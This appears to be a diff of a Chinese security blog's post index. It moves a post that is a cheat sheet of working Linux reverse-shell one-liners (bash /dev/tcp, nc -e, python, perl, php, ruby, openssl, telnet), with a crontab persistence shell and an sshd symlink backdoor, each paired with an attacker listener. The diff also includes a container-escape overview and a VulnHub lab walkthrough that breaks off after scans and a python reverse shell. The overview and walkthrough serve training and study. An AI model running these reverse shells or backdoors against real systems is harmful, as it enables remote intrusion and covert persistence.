-<h2 id="perl反弹"><a href="#perl反弹" class="headerlink" title="perl反弹"></a>perl反弹</h2><figure class="highlight tcl"><table><tr><td class="code"><pre><span class="line">靶机：</span><br><span class="line">perl -e &#x27;use Socket;<span class="variable">$i</span>=<span class="string">&quot;172.16.42.1&quot;</span>;<span class="variable">$p</span>=<span class="number">44044</span>;<span class="keyword">socket</span>(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="string">&quot;tcp&quot;</span>));<span class="keyword">if</span>(connect(S,sockaddr_in(<span class="variable">$p</span>,inet_aton(<span class="variable">$i</span>))))&#123;<span class="keyword">open</span>(STDIN,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">open</span>(STDOUT,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">open</span>(STDERR,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">exec</span>(<span class="string">&quot;/bin/sh -i&quot;</span>);&#125;;&#x27;</span><br><span class="line"></span><br><span class="line">攻击机：</span><br><span class="line">nc -lvvp <span class="number">44044</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="open-ssh-反弹"><a href="#open-ssh-反弹" class="headerlink" title="open ssh 反弹"></a>open ssh 反弹</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">靶机：</span><br><span class="line">mkfifo <span class="regexp">/tmp/</span>s; <span class="regexp">/bin/</span>sh -i &lt; <span class="regexp">/tmp/</span>s <span class="number">2</span>&gt;&amp;<span class="number">1</span> | openssl s_client -quiet -connect <span class="number">172.16</span>.<span class="number">42.150</span>:<span class="number">2333</span> &gt; <span class="regexp">/tmp/</span>s; rm <span class="regexp">/tmp/</span>s</span><br><span class="line"></span><br><span class="line">攻击机：</span><br><span class="line">openssl req -x509 -newkey rsa:<span class="number">2048</span> -keyout key.pem -out cert.pem -days <span class="number">365</span> -nodes</span><br><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port <span class="number">2333</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="SSH反弹"><a href="#SSH反弹" class="headerlink" title="SSH反弹"></a>SSH反弹</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">靶机：</span><br><span class="line">ln -sf <span class="regexp">/usr/</span>sbin<span class="regexp">/sshd /</span>tmp<span class="regexp">/su;/</span>tmp/su -oPort=<span class="number">8080</span>;</span><br><span class="line">攻击机：</span><br><span class="line">ssh root@<span class="number">172.16</span>.<span class="number">42.146</span> -p <span class="number">8080</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h2><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">靶机：</span><br><span class="line">(crontab -l;printf <span class="string">&quot;* * * * *  /usr/bin/python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="subst">\&quot;</span>172.16.42.146<span class="subst">\&quot;</span>,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([<span class="subst">\&quot;</span>/bin/sh<span class="subst">\&quot;</span>,<span class="subst">\&quot;</span>-i<span class="subst">\&quot;</span>]);&#x27;<span class="subst">\n</span>&quot;</span>)|crontab -</span><br><span class="line">攻击机：</span><br><span class="line">nc -lvvp <span class="number">8080</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><figure class="highlight tcl"><table><tr><td class="code"><pre><span class="line">靶机：</span><br><span class="line">php -r &#x27;<span class="variable">$sock</span>=fsockopen(<span class="string">&quot;172.16.42.146&quot;</span>,<span class="number">8080</span>);<span class="keyword">exec</span>(<span class="string">&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);&#x27;</span><br><span class="line">攻击机：</span><br><span class="line">nc -lvvp <span class="number">8080</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h2><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">靶机：</span><br><span class="line">ruby -rsocket -e &#x27;exit <span class="keyword">if</span> fork;c=<span class="module-access"><span class="module"><span class="identifier">TCPSocket</span>.</span></span><span class="keyword">new</span>(<span class="string">&quot;172.16.42.146&quot;</span>,<span class="string">&quot;8080&quot;</span>);<span class="keyword">while</span>(cmd=c.gets);<span class="module-access"><span class="module"><span class="identifier">IO</span>.</span></span>popen(cmd,<span class="string">&quot;r&quot;</span>)&#123;<span class="pattern-match">|io|c.print io.read&#125;<span class="keyword">end</span>&#x27;</span></span><br><span class="line"><span class="pattern-match">攻击机：</span></span><br><span class="line"><span class="pattern-match">nc -lvvp 8080</span></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://jkme.github.io/pages/reverse-shell.html">https://jkme.github.io/pages/reverse-shell.html</a></p>
-<p><a href="https://ninjia.gitbook.io/secskill/net/shell#php">https://ninjia.gitbook.io/secskill/net/shell#php</a></p>
-]]></content>
-      <categories>
-        <category>红队技术</category>
-      </categories>
-      <tags>
-        <tag>反弹shell</tag>
-        <tag>linux安全</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>linux持久化</title>
     <url>/linux%E6%8C%81%E4%B9%85%E5%8C%96/</url>
     <content><![CDATA[<blockquote>
@@ -1780,6 +1708,78 @@
       </categories>
       <tags>
         <tag>linux安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>linux下反弹shell</title>
+    <url>/linux%E4%B8%8B%E5%8F%8D%E5%BC%B9shell/</url>
+    <content><![CDATA[<blockquote>
+<p>桃李春风一杯酒，江湖夜雨十年灯。</p>
+</blockquote>
+<p>常见的一些linux反弹shell总结</p>
+<span id="more"></span>
+
+<h2 id="bash反弹"><a href="#bash反弹" class="headerlink" title="bash反弹"></a>bash反弹</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">靶机：</span><br><span class="line">bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp<span class="regexp">/172.16.42.1/</span><span class="number">44044</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">非bash环境：<span class="regexp">/bin/</span>bash -c <span class="string">&quot;/bin/bash -i &gt;&amp; /dev/tcp/172.16.42.1/44044 0&gt;&amp;1&quot;</span></span><br><span class="line"></span><br><span class="line">攻击机：</span><br><span class="line">nc -lvvp <span class="number">44044</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="zsh反弹"><a href="#zsh反弹" class="headerlink" title="zsh反弹"></a>zsh反弹</h2><figure class="highlight dart"><table><tr><td class="code"><pre><span class="line">靶机：zsh -c <span class="string">&#x27;zmodload zsh/net/tcp &amp;&amp; ztcp 172.16.42.1 44044 &amp;&amp; zsh &gt;&amp;<span class="subst">$REPLY</span> 2&gt;&amp;<span class="subst">$REPLY</span> 0&gt;&amp;<span class="subst">$REPLY</span>&#x27;</span></span><br><span class="line">攻击机：nc -lvvp <span class="number">44044</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="nc反弹"><a href="#nc反弹" class="headerlink" title="nc反弹"></a>nc反弹</h2> <figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">靶机：netcat <span class="number">172.16</span>.<span class="number">42.1</span> <span class="number">44044</span> -e <span class="regexp">/bin/</span>bash</span><br><span class="line">攻击机：nc -lvvp <span class="number">44044</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="nc正向反弹"><a href="#nc正向反弹" class="headerlink" title="nc正向反弹"></a>nc正向反弹</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">靶机：nc -lvp <span class="number">7777</span> -e <span class="regexp">/bin/</span>bash</span><br><span class="line">攻击机：nc <span class="number">172.16</span>.<span class="number">43.1</span> <span class="number">7777</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="telnet反弹"><a href="#telnet反弹" class="headerlink" title="telnet反弹"></a>telnet反弹</h2><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">靶机: mknod <span class="keyword">a</span> p; telnet <span class="number">172.16</span><span class="number">.42</span><span class="number">.1</span> <span class="number">44044</span> <span class="number">0</span>&lt;<span class="keyword">a</span> | /bin/bash <span class="number">1</span>&gt;<span class="keyword">a</span></span><br><span class="line">攻击机：nc -lvvp <span class="number">44044</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="python反弹"><a href="#python反弹" class="headerlink" title="python反弹"></a>python反弹</h2><figure class="highlight tcl"><table><tr><td class="code"><pre><span class="line">靶机：</span><br><span class="line">python -c &#x27;import <span class="keyword">socket</span>,subprocess,os;s=<span class="keyword">socket</span>.<span class="keyword">socket</span>(<span class="keyword">socket</span>.AF_INET,<span class="keyword">socket</span>.SOCK_STREAM);s.connect((<span class="string">&quot;172.16.42.1&quot;</span>,<span class="number">44044</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>); os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);&#x27;</span><br><span class="line"></span><br><span class="line">攻击机：</span><br><span class="line">nc -lvvp <span class="number">44044</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="perl反弹"><a href="#perl反弹" class="headerlink" title="perl反弹"></a>perl反弹</h2><figure class="highlight tcl"><table><tr><td class="code"><pre><span class="line">靶机：</span><br><span class="line">perl -e &#x27;use Socket;<span class="variable">$i</span>=<span class="string">&quot;172.16.42.1&quot;</span>;<span class="variable">$p</span>=<span class="number">44044</span>;<span class="keyword">socket</span>(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="string">&quot;tcp&quot;</span>));<span class="keyword">if</span>(connect(S,sockaddr_in(<span class="variable">$p</span>,inet_aton(<span class="variable">$i</span>))))&#123;<span class="keyword">open</span>(STDIN,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">open</span>(STDOUT,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">open</span>(STDERR,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">exec</span>(<span class="string">&quot;/bin/sh -i&quot;</span>);&#125;;&#x27;</span><br><span class="line"></span><br><span class="line">攻击机：</span><br><span class="line">nc -lvvp <span class="number">44044</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="open-ssh-反弹"><a href="#open-ssh-反弹" class="headerlink" title="open ssh 反弹"></a>open ssh 反弹</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">靶机：</span><br><span class="line">mkfifo <span class="regexp">/tmp/</span>s; <span class="regexp">/bin/</span>sh -i &lt; <span class="regexp">/tmp/</span>s <span class="number">2</span>&gt;&amp;<span class="number">1</span> | openssl s_client -quiet -connect <span class="number">172.16</span>.<span class="number">42.150</span>:<span class="number">2333</span> &gt; <span class="regexp">/tmp/</span>s; rm <span class="regexp">/tmp/</span>s</span><br><span class="line"></span><br><span class="line">攻击机：</span><br><span class="line">openssl req -x509 -newkey rsa:<span class="number">2048</span> -keyout key.pem -out cert.pem -days <span class="number">365</span> -nodes</span><br><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port <span class="number">2333</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="SSH反弹"><a href="#SSH反弹" class="headerlink" title="SSH反弹"></a>SSH反弹</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">靶机：</span><br><span class="line">ln -sf <span class="regexp">/usr/</span>sbin<span class="regexp">/sshd /</span>tmp<span class="regexp">/su;/</span>tmp/su -oPort=<span class="number">8080</span>;</span><br><span class="line">攻击机：</span><br><span class="line">ssh root@<span class="number">172.16</span>.<span class="number">42.146</span> -p <span class="number">8080</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h2><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">靶机：</span><br><span class="line">(crontab -l;printf <span class="string">&quot;* * * * *  /usr/bin/python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="subst">\&quot;</span>172.16.42.146<span class="subst">\&quot;</span>,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([<span class="subst">\&quot;</span>/bin/sh<span class="subst">\&quot;</span>,<span class="subst">\&quot;</span>-i<span class="subst">\&quot;</span>]);&#x27;<span class="subst">\n</span>&quot;</span>)|crontab -</span><br><span class="line">攻击机：</span><br><span class="line">nc -lvvp <span class="number">8080</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><figure class="highlight tcl"><table><tr><td class="code"><pre><span class="line">靶机：</span><br><span class="line">php -r &#x27;<span class="variable">$sock</span>=fsockopen(<span class="string">&quot;172.16.42.146&quot;</span>,<span class="number">8080</span>);<span class="keyword">exec</span>(<span class="string">&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);&#x27;</span><br><span class="line">攻击机：</span><br><span class="line">nc -lvvp <span class="number">8080</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h2><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">靶机：</span><br><span class="line">ruby -rsocket -e &#x27;exit <span class="keyword">if</span> fork;c=<span class="module-access"><span class="module"><span class="identifier">TCPSocket</span>.</span></span><span class="keyword">new</span>(<span class="string">&quot;172.16.42.146&quot;</span>,<span class="string">&quot;8080&quot;</span>);<span class="keyword">while</span>(cmd=c.gets);<span class="module-access"><span class="module"><span class="identifier">IO</span>.</span></span>popen(cmd,<span class="string">&quot;r&quot;</span>)&#123;<span class="pattern-match">|io|c.print io.read&#125;<span class="keyword">end</span>&#x27;</span></span><br><span class="line"><span class="pattern-match">攻击机：</span></span><br><span class="line"><span class="pattern-match">nc -lvvp 8080</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://jkme.github.io/pages/reverse-shell.html">https://jkme.github.io/pages/reverse-shell.html</a></p>
+<p><a href="https://ninjia.gitbook.io/secskill/net/shell#php">https://ninjia.gitbook.io/secskill/net/shell#php</a></p>
+]]></content>
+      <categories>
+        <category>红队技术</category>
+      </categories>
+      <tags>
+        <tag>linux安全</tag>
+        <tag>反弹shell</tag>
       </tags>
   </entry>
   <entry>
@@ -3105,76 +3105,6 @@ Any-Header: burpcollaborator.net</pre>
       </tags>
   </entry>
   <entry>
-    <title>容器云攻防体系介绍</title>
-    <url>/%E5%AE%B9%E5%99%A8%E4%BA%91%E6%94%BB%E9%98%B2%E4%BD%93%E7%B3%BB%E4%BB%8B%E7%BB%8D/</url>
-    <content><![CDATA[<blockquote>
-<p>上德不德，是以有德；下德不失德，是以无德。</p>
-</blockquote>
-<p>容器云可以看成是云原生应用的基础设施，包括容器和容器编排平台，容器编排平台目前一般使用的都是Kubernetes。本文主要分析容器和Kubernetes的攻击面以及如何防御。</p>
-<span id="more"></span>
-
-<h2 id="1-容器"><a href="#1-容器" class="headerlink" title="1. 容器"></a>1. 容器</h2><p>容器的概念大家都比较了解，我做个简单的介绍。容器使用到两个关键技术Namespaces和Cgroups。Linux Namespaces用于隔离容器的资源，Cgroups则用于限制资源。两者结合就把应用限制在一个容器这个盒子里，互不影响。</p>
-<h2 id="2-Kubernetes"><a href="#2-Kubernetes" class="headerlink" title="2. Kubernetes"></a>2. Kubernetes</h2><p>常见的Kubernetes集群结构图如下，Master节点是集群的控制节点，Node节点则是集群的工作节点。</p>
-<p><img src="../images/pic/k8s.png"></p>
-<p><img src="../images/pic/k8s18.jpg"> </p>
-<p><strong>Master节点：</strong></p>
-<p>master节点是负责管理其他节点的主节点</p>
-<p><strong>Node：</strong></p>
-<p>每个Node节点可以看做一个物理节点。</p>
-<p><strong>pod:</strong></p>
-<p>看第二张图片，每个node上运行着pod，pod相当于跑的一个容器，并且可以修改副本数量，让同一个pod配置文件管理多个容器副本。</p>
-<p><strong>API Server:</strong></p>
-<p>通过API Server接口可以对集群进行管理</p>
-<p><strong>kubelet:</strong></p>
-<p>每个节点都装有kubelet，它负责管理自己节点的Pod，同时，Master节点也是通过控制其他节点的kubelet来对其他节点的Pod进行管理。</p>
-<p><strong>etcd：</strong></p>
-<p>所有master的持续状态都存在etcd的一个实例中。这可以很好地存储配置数据。</p>
-<h2 id="3-容器云攻击面"><a href="#3-容器云攻击面" class="headerlink" title="3. 容器云攻击面"></a>3. 容器云攻击面</h2><p><img src="../images/pic/k8s0.jpg"> </p>
-<h3 id="3-1-容器逃逸"><a href="#3-1-容器逃逸" class="headerlink" title="3.1 容器逃逸"></a>3.1 容器逃逸</h3><p>容器安全中一个重要的攻击点就是容器逃逸，容器逃逸就是从容器中进行权限提升获取宿主机的权限。</p>
-<p>容器逃逸手法有很多，我们做个简单的介绍。</p>
-<p><strong>危险目录挂载：</strong></p>
-<p>如果我们将宿主机根目录、root目录、/root/.ssh等危险目录挂载进了容器，这是很危险的一件事。比如在启动容器的时候将根目录挂载进容器，那么在容器里面可以使用chroot将宿主机目录当做容器的根目录，然后反弹一个shell获取宿主机的shell，或者写入ssh公钥或者写入定时任务等都可以获取到宿主机的shell。从而逃逸容器。</p>
-<p>除了上面说的挂载危险目录，还有两个特殊的目录，Docker Socket和procfs。如果宿主机将Docker Socket的目录/var/run/docker.sock 挂载进行容器，也就是说此容器可以管理其他容器，那么我们就是可以在容器里面创建一个挂载危险目录的容器从而实现逃逸；procfs是一个伪文件系统，存储的是当前内核运行状态的一系列特殊文件，从2.6.19内核版本开始，加入了一个新特性，在/proc/sys/kernel/core_pattern中，如果在该文件中的首个字符是管道符（|），那么该行的剩余内容将被当做脚本进行解析，那么我们就可以在管道符后写入后门程序达到命令执行的效果，如果把宿主机的/proc目录挂载进来，那么我们就可以把这个后门写入到宿主机上，从而实现逃逸。</p>
-<p><strong>容器相关组件漏洞：</strong></p>
-<p>CVE-2019-5736 runC容器逃逸漏洞：</p>
-<p>runC是Docker内置的一个基础客户端工具，在存在漏洞版本的docker中，容器内部通过proc虚拟文件系统访问到runc文件并写入恶意代码，怎么触发呢？触发使用到了proc目录下的/proc/PID/exe，它指向进程自身对应的本地文件。比如如果我们使用docker exec -it /bin/sh，如果我们替换掉容器里的/bin/sh为/proc/[runC-PID]/exe，那么就会调用我们刚刚写入恶意代码的runc，导致恶意命令被执行，由于runc是在docker守护进程里具有宿主机的root权限，相当于逃逸了容器。</p>
-<p>CVE-2018-15664:符号链接替换漏洞：</p>
-<p>CVE-2018-15664是一个条件竞争引起的漏洞，当用户执行docker cp命令的时候Docker守护进程会先检查复制的路径，检查的时候如果有容器内部的符号链接，会先解析符号链接，然后放置，等待检查完后进行复制操作。这其中存在一个间隙，如果我们在执行复制之前，将执行容器内的路径替换成一个符号链接，那么复制的时候，宿主机的docker就会解析的这个符号链接，就会以docker守护进程的权限把容器内的文件复制到宿主机，这个漏洞比较鸡肋。攻击场景局限在非root用户的宿主机权限，并且有docker交互的权限，这时候可以使用这个方法修改/etc/shadow文件实现提权，并且由于需要条件竞争成功率并不高。如果有了这些权限完全可以启动一个特权容器进行逃逸。</p>
-<p>CVE-2019-14271:加载不受信任的动态链接：</p>
-<p>在存在漏洞版本的Docker中，在执行Docker cp命令后，Docker守护进程会启动一个docker-tar进程来完成这项复制任务。docker-tar会在容器里执行chroot后加载一些动态链接库，如果我们在容器里放置恶意的动态链接库，就会被加载到容器外的docker-tar(root权限)运行。</p>
-<p><strong>Capabilites安全问题:</strong></p>
-<p>Linux内核中的Capabilities特性用于划分特权集，相当于是对权限做了更细致的划分，比如可以通过给ping应用添加CAP_NET_RAW特权集，使其具有使用网络的特权集，而不具备其他特权集。容器也支持Capabilities，我们可以指定各种特权来限制容器的权限。如果给的权限过大那么就可能导致容器逃逸。</p>
-<ul>
-<li>–privileged或者–cap-add=ALL可以获得所有特权集，如果容器通过privileged启动那么可以很轻松的逃逸容器。</li>
-<li>SYS_ADMIN特权也可以逃逸，但是有比较大的限制，需要启动容器的时候开启额外的配置</li>
-<li>SYS_PTRACE特权结合进程注入也可以逃逸容器，根上面一样启动容器的时候开启额外的配置</li>
-<li>SYS_MODULE特权可以通过加载内核模块进行逃逸，这种利用起来比较方便</li>
-</ul>
-<p><strong>linux内核漏洞：</strong></p>
-<p>利用Linux内核漏洞也是可以逃逸的，比如著名的脏牛。</p>
-<h3 id="3-2-Docker-Remote-API-未授权"><a href="#3-2-Docker-Remote-API-未授权" class="headerlink" title="3.2 Docker Remote API 未授权"></a>3.2 Docker Remote API 未授权</h3><p>如果开起了Docker Remote API，可远程调用API来操作docker。如果我们通过Docker Remote API创建一个特权容器，相当于我们完全控制了主机。</p>
-<h3 id="3-3-镜像安全"><a href="#3-3-镜像安全" class="headerlink" title="3.3 镜像安全"></a>3.3 镜像安全</h3><p>镜像安全存在两种风险，一是使用的镜像存在漏洞，比如使用了有漏洞的应用组件；二是镜像投毒，使用了恶意的镜像。</p>
-<h3 id="3-4-Kubernetes相关组件未授权访问"><a href="#3-4-Kubernetes相关组件未授权访问" class="headerlink" title="3.4 Kubernetes相关组件未授权访问"></a>3.4 Kubernetes相关组件未授权访问</h3><p>在老版本或者通过配置让Kubernetes的端口直接对外暴露会产生高危安全问题，比如Kubernetes API Server未授权，Dashboard未授权访问，kubelet未授权访问等。</p>
-<h3 id="3-5-通过Kubernetes部署后门pod实现持久化"><a href="#3-5-通过Kubernetes部署后门pod实现持久化" class="headerlink" title="3.5 通过Kubernetes部署后门pod实现持久化"></a>3.5 通过Kubernetes部署后门pod实现持久化</h3><p>比如可以部署一个特权容器的pod；如果部署的是一个Daemonset后门pod，这个Pod会自动在每一个节点上都部署一个后门pod。还可以部署一个CronJobs的pod后门，实现定时执行恶意命令。</p>
-<h3 id="3-5-Kubernetes相关漏洞"><a href="#3-5-Kubernetes相关漏洞" class="headerlink" title="3.5 Kubernetes相关漏洞"></a>3.5 Kubernetes相关漏洞</h3><p>CVE-2018-1002105: Kuberntes权限提升：</p>
-<p>此漏洞让能够访问集群的用户获取admin的权限，原理是http请求在升级为websockt的时候，中间代理错误处理不全，导致引起部分错误的请求会直接通过API Serever建立websockt连接，从而控制集群。</p>
-<p>CVE-2019-11253:YAML炸弹：</p>
-<p>通过恶意的yaml，让API Server消耗大量CPU资源，导致拒绝服务攻击。</p>
-<p>CVE-2019-9512/9514: HTTP/2 协议实现存在问题：</p>
-<p>HTTP/2的go实现库存在漏洞，导致处理恶意的HTTP/2流量的时候消耗大量资源，从而拒绝服务</p>
-<h3 id="3-6-Kubernetes网络中间人攻击"><a href="#3-6-Kubernetes网络中间人攻击" class="headerlink" title="3.6 Kubernetes网络中间人攻击"></a>3.6 Kubernetes网络中间人攻击</h3><p>Kubernetes集群中也是可以进行中间人攻击的，通过修改dns解析的地址，劫持流量。解决方案是更细粒度的权限控制，禁用pod的CAP_NET_RAW权限，这样就无法发送ARP和DNS报文。</p>
-<h2 id="4-容器云运行时安全"><a href="#4-容器云运行时安全" class="headerlink" title="4. 容器云运行时安全"></a>4. 容器云运行时安全</h2><p>容器云运行时安全我们使用的方案是用falco进行内核监控，使用它自带的规则和我们自定义的规则来做监控。它的底层是使用的eBPF技术。</p>
-<h3 id="4-1-eBPF"><a href="#4-1-eBPF" class="headerlink" title="4.1 eBPF"></a>4.1 eBPF</h3><p>eBPF是一种包过滤技术，最开始是用来处理网络包的，像tcpdum就是基于eBPF开发的。它的特点就是可以将用户空间的代码直接放到内核去跑，而不用重新编译内核。比如我们用python或者C写的eBPF程序，编译后交给eBPF，就会将代码挂到程序指定的内核位置运行。</p>
-<p>未完待续……</p>
-]]></content>
-      <categories>
-        <category>云原生安全</category>
-      </categories>
-      <tags>
-        <tag>容器云</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>容器编排平台-Kubernetes安全</title>
     <url>/%E5%AE%B9%E5%99%A8%E7%BC%96%E6%8E%92%E5%B9%B3%E5%8F%B0-Kubernetes%E5%AE%89%E5%85%A8/</url>
     <content><![CDATA[<blockquote>
@@ -3345,80 +3275,73 @@ Any-Header: burpcollaborator.net</pre>
       </tags>
   </entry>
   <entry>
-    <title>打靶练习1</title>
-    <url>/%E6%89%93%E9%9D%B6%E7%BB%83%E4%B9%A01/</url>
+    <title>容器云攻防体系介绍</title>
+    <url>/%E5%AE%B9%E5%99%A8%E4%BA%91%E6%94%BB%E9%98%B2%E4%BD%93%E7%B3%BB%E4%BB%8B%E7%BB%8D/</url>
     <content><![CDATA[<blockquote>
-<p>天长地久。天地所以能长且久者，以其不自生，故能长生。</p>
+<p>上德不德，是以有德；下德不失德，是以无德。</p>
 </blockquote>
-<p>靶机：BoredHackerBlog: Social Network</p>
+<p>容器云可以看成是云原生应用的基础设施，包括容器和容器编排平台，容器编排平台目前一般使用的都是Kubernetes。本文主要分析容器和Kubernetes的攻击面以及如何防御。</p>
 <span id="more"></span>
 
-
-
-<p>靶机地址：<a href="https://www.vulnhub.com/entry/boredhackerblog-social-network,454/">https://www.vulnhub.com/entry/boredhackerblog-social-network,454/</a></p>
-<p>建议使用VirtualBox搭建环境</p>
-<p><strong>局域网二层扫描</strong></p>
-<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo arp-scan -l</span></span><br></pre></td></tr></table></figure>
-
-<ol>
-<li><p>判断存活主机</p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo</span> ./Ladon <span class="number">192.168.0.101</span>/<span class="number">24</span> IcmpScan</span><br></pre></td></tr></table></figure></li>
-<li><p>端口扫描，确定ip</p>
-<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> <span class="number">192.168.0.104</span></span><br></pre></td></tr></table></figure></li>
-<li><p>全端口扫描：</p>
-<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -p- <span class="number">192.168.0.104</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Starting</span> Nmap <span class="number">7</span>.<span class="number">91</span> ( https://nmap.org ) at <span class="number">2021</span>-<span class="number">10</span>-<span class="number">31</span> <span class="number">11</span>:<span class="number">05</span> CST</span><br><span class="line"><span class="attribute">Nmap</span> scan report for <span class="number">192.168.0.104</span></span><br><span class="line"><span class="attribute">Host</span> is up (<span class="number">0</span>.<span class="number">0013</span>s latency).</span><br><span class="line"><span class="attribute">Not</span> shown: <span class="number">65533</span> closed ports</span><br><span class="line"><span class="attribute">PORT</span>     STATE SERVICE</span><br><span class="line"><span class="attribute">22</span>/tcp   open  ssh</span><br><span class="line"><span class="attribute">5000</span>/tcp open  upnp</span><br></pre></td></tr></table></figure>
-
-</li>
-<li><p>服务扫描</p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -p<span class="number">22</span>,<span class="number">5000</span> -sV <span class="number">192.168.0.104</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">PORT</span>     STATE SERVICE VERSION</span><br><span class="line"><span class="attribute">22</span>/tcp   open  ssh     OpenSSH <span class="number">6</span>.<span class="number">6</span>p<span class="number">1</span> Ubuntu <span class="number">2</span>ubuntu<span class="number">1</span> (Ubuntu Linux; protocol <span class="number">2</span>.<span class="number">0</span>)</span><br><span class="line"><span class="attribute">5000</span>/tcp open  http    Werkzeug httpd <span class="number">0</span>.<span class="number">14</span>.<span class="number">1</span> (Python <span class="number">2</span>.<span class="number">7</span>.<span class="number">15</span>)</span><br><span class="line"><span class="attribute">Service</span> Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure></li>
-<li><p>目录扫描</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">ffuf -w ~<span class="regexp">/wordlist/</span>Web-Fuzzing-Box<span class="regexp">/Dir/</span>Directories.txt -u http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">0.104</span>:<span class="number">5000</span>FUZZ -mc all -v -fc <span class="number">404</span></span><br></pre></td></tr></table></figure>
-
-<p><a href="http://192.168.0.104:5000/admin">http://192.168.0.104:5000/admin</a></p>
-</li>
-<li><p>python反弹shell</p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;192.168.0.101&quot;</span>,<span class="number">8081</span>));os.dup<span class="number">2</span>(s.fileno(),<span class="number">0</span>); os.dup<span class="number">2</span>(s.fileno(),<span class="number">1</span>); os.dup<span class="number">2</span>(s.fileno(),<span class="number">2</span>);p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);</span><br></pre></td></tr></table></figure></li>
-<li><p>容器识别：</p>
